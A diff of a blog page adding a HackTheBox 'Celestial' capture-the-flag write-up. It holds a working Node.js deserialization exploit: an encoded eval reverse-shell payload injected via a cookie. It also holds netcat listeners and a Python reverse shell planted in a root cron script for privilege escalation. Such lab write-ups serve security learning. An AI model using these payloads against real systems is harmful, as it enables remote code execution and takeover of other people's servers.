@@ -49,14 +49,18 @@
 
 
 
+  
+  
+  
+
 
 <!-- Open Graph image and Twitter Card metadata -->
 
-<title itemprop="name"></title>
-<meta property="og:title" content=ZgotmplZ />
-<meta name="twitter:title" content=ZgotmplZ />
-<meta itemprop="name" content=ZgotmplZ />
-<meta name="application-name" content=ZgotmplZ />
+<title itemprop="name">pL4StiC - HtB - Celestial</title>
+<meta property="og:title" content=pL4StiC&#32;-&#32;HtB&#32;-&#32;Celestial />
+<meta name="twitter:title" content=pL4StiC&#32;-&#32;HtB&#32;-&#32;Celestial />
+<meta itemprop="name" content=pL4StiC&#32;-&#32;HtB&#32;-&#32;Celestial />
+<meta name="application-name" content=pL4StiC&#32;-&#32;HtB&#32;-&#32;Celestial />
 <meta property="og:site_name" content="" />
 
 
@@ -66,18 +70,17 @@
 <meta name="twitter:description" content="" />
 
 
-<base href="https://pL4sTiC1337.github.io/tags/hard/" />
-<link rel="canonical" href="https://pL4sTiC1337.github.io/tags/hard/" itemprop="url" />
-<meta name="url" content="https://pL4sTiC1337.github.io/tags/hard/" />
-<meta name="twitter:url" content="https://pL4sTiC1337.github.io/tags/hard/" />
-<meta property="og:url" content="https://pL4sTiC1337.github.io/tags/hard/" />
+<base href="https://pL4sTiC1337.github.io/writeups/htb-celestial/" />
+<link rel="canonical" href="https://pL4sTiC1337.github.io/writeups/htb-celestial/" itemprop="url" />
+<meta name="url" content="https://pL4sTiC1337.github.io/writeups/htb-celestial/" />
+<meta name="twitter:url" content="https://pL4sTiC1337.github.io/writeups/htb-celestial/" />
+<meta property="og:url" content="https://pL4sTiC1337.github.io/writeups/htb-celestial/" />
 
 
-<meta property="og:updated_time" content="2025-03-23T15:45:37-04:00" />
+<meta property="og:updated_time" content="2025-04-11T10:54:25-05:00" />
 
 
 <link rel="sitemap" type="application/xml" title="Sitemap" href='https://pL4sTiC1337.github.io/sitemap.xml' />
-<link href="https://pL4sTiC1337.github.io/tags/hard/index.xml" rel="alternate" type="application/rss+xml" title="" />
 
 <meta name="robots" content="index,follow" />
 <meta name="googlebot" content="index,follow" />
@@ -503,34 +506,206 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </aside>
 
             <main class="content container">
-                <h1 class="title">Hard</h1>
-<ul class="entries">
-    
-        <h3 style="text-align: center;">2025</h3>
-        
-            <li>
-                <span class="title">
-                    <a href="/writeups/htb-zipper/">Htb Zipper</a>
-                </span>
-                <span class="published">
-                    <time class="pull-right post-list">March 23, 2025</time>
-                </span>
-            </li>
-        
-            <li>
-                <span class="title">
-                    <a href="/writeups/htb-monitors/">HtB Monitors</a>
-                </span>
-                <span class="published">
-                    <time class="pull-right post-list">March 14, 2025</time>
-                </span>
-            </li>
-        
-    
-</ul>
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="https://pL4sTiC1337.github.io/writeups/htb-celestial/">HtB - Celestial</a>
+  </h1>
 
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2025-04-11T10:54:25-0500" class="post-date">
+        April 11, 2025
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>3 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-writeup">
+        <a href="https://pL4sTiC1337.github.io/tags/writeup">writeup</a>
+      </li>
+      
+      <li class="tag-hackthebox">
+        <a href="https://pL4sTiC1337.github.io/tags/hackthebox">hackthebox</a>
+      </li>
+      
+      <li class="tag-medium">
+        <a href="https://pL4sTiC1337.github.io/tags/medium">medium</a>
+      </li>
+      
+      <li class="tag-linux">
+        <a href="https://pL4sTiC1337.github.io/tags/linux">linux</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <p><img src="/images/Celestial.png" alt="HtB-Celestial"></p>
+<p>Celestial is a medium difficulty machine which focuses on deserialization exploits. It is not the most realistic, however it provides a practical example of abusing client-size serialized objects in NodeJS framework.</p>
+<hr>
+<h2 id="scanning">Scanning</h2>
+<h3 id="nmap">nmap</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/celestial<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -T4 -p- -A 10.129.228.94
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>3000/tcp open  http    Node.js Express framework
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#ae81ff">\&#39;</span>t have a title <span style="color:#f92672">(</span>text/html; charset<span style="color:#f92672">=</span>utf-8<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running: Linux 3.X|4.X
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+</span></span><span style="display:flex;"><span>OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
+</span></span></code></pre></div><h3 id="http---3000tcp">HTTP - 3000/tcp</h3>
+<p><img src="/images/celestial1.png" alt="celestial1"></p>
+<p>Can&rsquo;t fuzz much on the website, but a look at the headers reveals a cookie is set.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/celestial<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl http://10.129.228.94:3000/ -i
+</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>X-Powered-By: Express
+</span></span><span style="display:flex;"><span>Set-Cookie: profile<span style="color:#f92672">=</span>eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D; Max-Age<span style="color:#f92672">=</span>900; Path<span style="color:#f92672">=</span>/; Expires<span style="color:#f92672">=</span>Mon, <span style="color:#ae81ff">03</span> Mar <span style="color:#ae81ff">2025</span> 02:24:57 GMT; HttpOnly
+</span></span><span style="display:flex;"><span>Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">12</span>
+</span></span><span style="display:flex;"><span>ETag: W/<span style="color:#e6db74">&#34;c-8lfvj2TmiRRvB7K+JPws1w9h6aY&#34;</span>
+</span></span><span style="display:flex;"><span>Date: Mon, <span style="color:#ae81ff">03</span> Mar <span style="color:#ae81ff">2025</span> 02:09:57 GMT
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span></code></pre></div><p>Cookie Value: <code>{&quot;username&quot;:&quot;Dummy&quot;,&quot;country&quot;:&quot;Idk Probably Somewhere Dumb&quot;,&quot;city&quot;:&quot;Lametown&quot;,&quot;num&quot;:&quot;2&quot;}</code></p>
+<h2 id="initial-access">Initial Access</h2>
+<h3 id="ssti">SSTI</h3>
+<p>Messing with the cookie values, it appears as if when we change the <code>num</code> value to <code>1</code>, the website changes and says: &ldquo;Hey Dummy 1 + 1 is 11&rdquo;. The website is taking cookie values and generating dynamic content. Maybe we can do an injection of some sort here.</p>
+<p>After playing with a few payloads, I see an actual computation on an SSTI payload:
+<code>{&quot;username&quot;:&quot;Dummy&quot;,&quot;country&quot;:&quot;Idk Probably Somewhere Dumb&quot;,&quot;city&quot;:&quot;Lametown&quot;,&quot;num&quot;:&quot;{{7*7}}&quot;}</code></p>
+<p><img src="/images/celestial2.png" alt="celestial2"></p>
+<h3 id="deserialization">Deserialization</h3>
+<p>I wasn&rsquo;t getting anywhere with the SSTI approach, so continued my research into NodeJS and the Express framework. During my research, I came across an interesting <a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/" target="_blank">deserialization attack</a> that might be applicable here.</p>
+<p>Download your <a href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py" target="_blank">nodejsshell.py</a> and generate your reverse shell script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/celestial<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python2.7 nodejsshell.py 10.10.14.142 <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> LHOST <span style="color:#f92672">=</span> 10.10.14.142
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> LPORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Encoding
+</span></span><span style="display:flex;"><span>eval<span style="color:#f92672">(</span>String.fromCharCode<span style="color:#f92672">(</span>10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,52,46,49,52,50,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10<span style="color:#f92672">))</span>
+</span></span></code></pre></div><p>Now generate your serialized payload, base64 encode it, and replace the cookie value.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;rce&#34;</span>:<span style="color:#e6db74">&#34;_$$ND_FUNC$$_ function (){&lt;&lt;Paste Encoding&gt;&gt;}()&#34;</span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/celestial<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nc -nvlp <span style="color:#ae81ff">4444</span>                   
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.142<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.228.94<span style="color:#f92672">]</span> <span style="color:#ae81ff">50644</span>
+</span></span><span style="display:flex;"><span>Connected!
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>sun
+</span></span></code></pre></div><p>Grab the <code>user.txt</code> and let&rsquo;s move on.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="linpeassh">linpeas.sh</h3>
+<p>Easy, probably unintended routes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╔══════════╣ Executing Linux Exploit Suggester
+</span></span><span style="display:flex;"><span>╚ https://github.com/mzet-/linux-exploit-suggester                                                               
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>CVE-2017-16995<span style="color:#f92672">]</span> eBPF_verifier
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>CVE-2016-8655<span style="color:#f92672">]</span> chocobo_root
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>CVE-2016-5195<span style="color:#f92672">]</span> dirtycow
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>CVE-2016-5195<span style="color:#f92672">]</span> dirtycow <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>CVE-2021-4034<span style="color:#f92672">]</span> PwnKit
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>CVE-2021-3156<span style="color:#f92672">]</span> sudo Baron Samedit <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>CVE-2017-7308<span style="color:#f92672">]</span> af_packet
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>CVE-2017-6074<span style="color:#f92672">]</span> dccp
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>CVE-2017-1000112<span style="color:#f92672">]</span> NETIF_F_UFO
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>CVE-2016-4557<span style="color:#f92672">]</span> double-fdput<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>CVE-2022-32250<span style="color:#f92672">]</span> nft_object UAF <span style="color:#f92672">(</span>NFT_MSG_NEWSET<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>CVE-2022-2586<span style="color:#f92672">]</span> nft_object UAF
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>CVE-2021-3156<span style="color:#f92672">]</span> sudo Baron Samedit
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>CVE-2021-22555<span style="color:#f92672">]</span> Netfilter heap out-of-bounds write
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>CVE-2019-18634<span style="color:#f92672">]</span> sudo pwfeedback
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>CVE-2019-15666<span style="color:#f92672">]</span> XFRM_UAF
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>CVE-2018-1000001<span style="color:#f92672">]</span> RationalLove
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>CVE-2017-1000366,CVE-2017-1000379<span style="color:#f92672">]</span> linux_ldso_hwcap_64
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>CVE-2017-1000253<span style="color:#f92672">]</span> PIE_stack_corruption
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>CVE-2016-9793<span style="color:#f92672">]</span> SO_<span style="color:#f92672">{</span>SND|RCV<span style="color:#f92672">}</span>BUFFORCE
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>CVE-2016-2384<span style="color:#f92672">]</span> usb-midi
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>CVE-2016-0728<span style="color:#f92672">]</span> keyring
+</span></span></code></pre></div><h3 id="cron-job">Cron Job</h3>
+<p>Notice that the file <code>/home/sun/output.txt</code> is very recently updated, and seems to be updated every ~5 minutes or so.  Further enumeration yields a python script at <code>/home/sun/Documents/script.py</code> that, based on the code, is likely generating that output file. Oh, by the way, the <code>output.txt</code> is owned by <code>root</code>. I wonder if it&rsquo;s a cron job?</p>
+<p>We have write permissions for <code>script.py</code>, so let&rsquo;s replace it with a nice reverse shell and setup a listener to see what happens.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span>os<span style="color:#f92672">,</span>pty
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;10.10.14.142&#34;</span>,<span style="color:#ae81ff">5555</span>))
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>pty<span style="color:#f92672">.</span>spawn(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>)
+</span></span></code></pre></div><p>I transferred this over via HTTP to replace <code>script.py</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/celestial<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nc -nvlp <span style="color:#ae81ff">5555</span>                      
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">5555</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.142<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.228.94<span style="color:#f92672">]</span> <span style="color:#ae81ff">46914</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># whoami</span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>Now grab <code>root.txt</code></p>
+  
+  <hr>
+<div class="footer">
+    
+	    
+            <a class="previous-post" href="https://pL4sTiC1337.github.io/writeups/htb-zipper/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Htb Zipper</a>
+        
+	    
+    
+</div>
+
+  
+</div>
             </main>
             
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#scanning">Scanning</a>
+      <ul>
+        <li><a href="#nmap">nmap</a></li>
+        <li><a href="#http---3000tcp">HTTP - 3000/tcp</a></li>
+      </ul>
+    </li>
+    <li><a href="#initial-access">Initial Access</a>
+      <ul>
+        <li><a href="#ssti">SSTI</a></li>
+        <li><a href="#deserialization">Deserialization</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#linpeassh">linpeas.sh</a></li>
+        <li><a href="#cron-job">Cron Job</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
         </div>
     </body>
 </html>
